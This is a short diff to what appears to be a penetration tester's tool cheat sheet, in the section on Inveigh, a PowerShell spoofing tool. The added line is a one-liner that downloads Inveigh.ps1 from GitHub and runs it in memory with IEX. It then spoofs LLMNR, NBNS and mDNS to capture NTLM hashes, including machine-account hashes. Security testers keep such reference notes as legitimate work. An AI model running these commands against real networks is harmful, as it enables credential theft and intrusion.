@@ -34,7 +34,8 @@
   PowerShell based Responder: https://github.com/Kevin-Robertson/Inveigh   
   Note: Requires elevated privileges!   
   Example:   
-  `Invoke-Inveigh -LLMNR Y -mDNS Y -NBNS Y -SpooferIP 172.10.10.1 -ConsoleOutput Y -HTTP N`   
+  `Invoke-Inveigh -LLMNR Y -mDNS Y -NBNS Y -SpooferIP 172.10.10.1 -ConsoleOutput Y -HTTP N`
+  `IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1");Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y` 
   
 - SSLScan   
   https://github.com/rbsec/sslscan/releases/   
